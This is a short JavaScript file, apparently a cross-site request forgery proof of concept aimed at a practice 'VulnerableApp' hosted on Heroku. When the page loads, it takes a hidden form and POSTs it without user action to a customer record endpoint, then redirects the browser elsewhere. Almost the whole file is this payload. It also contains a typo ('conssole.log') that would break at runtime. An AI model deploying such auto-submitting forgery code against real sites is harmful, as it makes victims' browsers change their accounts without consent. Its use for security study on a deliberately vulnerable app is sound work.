window.addEventListener("DOMContentLoaded", () => {
	// const iframe = document.getElementById("csrf-iframe");
  // const form = iframe.contentWindow.document.querySelector('#csrf-form');
  const form = document.querySelector('#csrf-form');

  const formData = new FormData(document.getElementById("csrf-form"));
  const XHR = new XMLHttpRequest();
    XHR.open("POST", "https://vulnerable-app1.herokuapp.com/customers/4", true);
    XHR.responseType = "json";
    XHR.send(formData);
    XHR.onload = () => {
      conssole.log("ok")
      location.href="https://kotonekurita.github.io/VulnerableApp/"
      return null
    }
  // form.submit()
})
